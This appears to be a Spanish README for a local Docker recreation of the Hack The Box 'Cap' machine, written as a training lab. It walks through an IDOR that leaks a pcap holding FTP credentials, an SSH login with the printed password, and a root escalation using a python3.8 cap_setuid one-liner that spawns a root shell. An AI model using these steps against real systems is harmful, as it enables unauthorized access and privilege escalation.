# Cap HTB - Docker Machine

## Despliegue

```bash
# Construir
sh start.sh
```

## Acceso
- Web: http://localhost:8181
- SSH/FTP: localhost:2200 / localhost:2100

## Vulnerabilidades reproducidas

### 1. IDOR en /data/<id>
La aplicación guarda capturas de red identificadas por un número en la URL.
No hay comprobación de propiedad: cualquier usuario puede acceder a `/data/0`
aunque la captura sea de otro usuario.

**Pasos:**
1. Visita `http://localhost:8181/capture` → redirige a `/data/<N>` (tuya, vacía)
2. Cambia la URL a `http://localhost/data/0` → captura pre-seeded con credenciales FTP
3. Descarga el `.pcap` y ábrelo con Wireshark
4. Filtra por `ftp` → ves `USER nathan` y `PASS Buck3tH4TF0RM3!` en texto plano

### 2. Foothold via FTP credentials
```bash
ssh nathan@localhost -p 2200  # contraseña: Buck3tH4TF0RM3!
```

### 3. Privilege Escalation - cap_setuid en Python3.8
```bash
# Verificar la capability
getcap /usr/bin/python3.8
# → /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

# Escalar a root
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Obtener flag
cat /root/root.txt
```

## Flags
- User flag: `/home/nathan/user.txt`
- Root flag: `/root/root.txt`

## Clean
Al terminar borrar el contenedor 
```bash
sh clean.sh
```
